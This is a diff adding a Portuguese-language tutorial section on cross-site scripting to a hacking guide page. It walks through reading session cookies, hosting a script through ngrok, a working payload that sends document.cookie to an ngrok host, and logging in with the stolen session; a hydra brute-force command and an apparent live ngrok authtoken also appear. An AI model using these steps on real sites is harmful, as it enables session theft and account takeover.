@@ -246,6 +246,44 @@ proxychains hydra -l nomedousuario -P wordlist.txt http://nomeouipdoalvo.com ssh
 </code>
 </pre>
 
+<h3>Cross-Site Scripting (XSS) - Atacando o Cliente</h3>
+
+<p>Quando o conteúdo do parâmetro da URL não filtra os dados, ele permite execução de códigos Javascript diretamente na página, os ataques em XSS se baseiam nisso daí.</p>
+
+<p>Como sabemos, é só passar num parâmetro algum código em linguagens clientes, como HTML ou Javascript, como por exemplo <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>, se o código executar, o site está vulnerável. Se conseguirmos, por exemplo, guardar esse código num banco de dados do site, podemos inclusive fazer um XSS persistente, que sempre será executado ao ser acesso.</p>
+
+<p>Podemos por exemplo, pegar o cookie de sessão para logarmos numa conta de um determinado site sem precisar da senha.</p>
+
+<p>No nosso site vulnerável, coloque por exemplo no link: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>. Ele retornará o cookie do documento (que pode estar vazio). Podemos ver que é o mesmo valor indo nas ferramentas do navegador, em Armazenamento e Cookies. Veremos se ele tem a opção HttpOnly como <q>true</q>, que indicará se ele poderá ser extraído por outros sites ou pelo Javascript.</p>
+
+<p>Logue no site e veja se ele criará um cookie para isso. Ele terá no caso, o nome PHPSESSION, e o HttpOnly, caso esteja como <q>false</q>, poderemos extrair ele pelo Javascript. Rode o comando com o <q>document.cookie</q> novamente e veja se ele retorna algo como <code>PHPSESSID=014on0ktebfr8teoit0r44dgl0</code>. Caso ele retorne, podemos roubar a sessão de login dessa mesma conta.</p>
+
+<p>No caso, usaremos um parâmetro src na tag script para referenciarmos o código Javascript que inseriremos no site. Caso ele não esteja configurado para bloquear, será possível fazer esse ataque. Veja mais sobre isso nesse site <a href="https://owasp.org/www-project-secure-headers/#div-headers" target="_blank">https://owasp.org/www-project-secure-headers/#div-headers</a></p>
+
+<p>Para verificar se existe um desses <q>headers</q> no site, abra a ferramenta de desenvolvedor do navegador, carregue a página e vá até na opção headers e procure a opção <q>script-src</q>.</p>
+
+<p>Para criar um servidor no nosso computador, basta digitar no terminal <code>python3 -m http.server</code> e utilize o link para acessar esse servidor (como por exemplo, <code>http://0.0.0.0:8000/</code>, no próprio navegador). Ele rodará o servidor a partir da pasta na qual o terminal está. Na mesma pasta, crie um arquivo js para colocar nosso código, que por enquanto será um simples alerta para testar o programa.</p>
+
+<p>PS: Caso você tenha algum bloqueador de anúncios no navegador, desative ele, pois eles bloqueiam esses tipos de scripts, o mesmo vale para extensões como "NoScript".</p>
+
+<p>Só que esse programa só rodará na nossa rede local, para colocarmos num site externo, precisaremos de uma ferramenta chamada Ngrok. Instale ela no Linux. E vá nesse site e crie uma conta: <a href="https://dashboard.ngrok.com/get-started/your-authtoken" target="_blank">https://dashboard.ngrok.com/get-started/your-authtoken</a></p>
+
+<p>Execute o token de autenticação desse link acima colando no terminal <code>ngrok config add-authtoken 2WuSL5sulv2PLVx84eSXZ2DFnTQ_6p9RX5ute9tR1JZw9S1N8</code>. Depois digite o comando <code>ngrok http 8000</code>. Basta copiar o link em <q>forwarding</q> (como por exemplo <code>https://6cd2-2804-431-c7e4-3aac-c445-a16a-9c2e-5792.ngrok.io/ataque.js</code>) e ele estará com nosso diretório disponível, com o arquivo js criado por nós.</p>
+
+<p>No caso, no Javascript, deixaremos apenas esse código:</p>
+
+<pre>
+<code>
+new Image().src = "https://3b42-2804-431-c7e4-3aac-c445-a16a-9c2e-5792.ngrok.io/?" + document.cookie; // Não esqueça da interrogação
+</code>
+</pre>
+
+<p>Dessa forma, obteremos o cookie através do link em qualquer local no mundo.</p>
+
+<p>Para logar, basta ir nas ferramentas do navegador, e no Armazenamento, basta colocar o valor <q>roubado</q> no cookie PHPSESSIONID e recarregar a página que será logado.</p>
+
+<!-- Carece de correção -->
+
 <ul>
     <li><a href="tudo-sobre-hacking-6.html">Parte Anterior da Matéria!</a></li>
     <li><a href="tudo-sobre-hacking-8.html">Continuação da Matéria!</a></li>
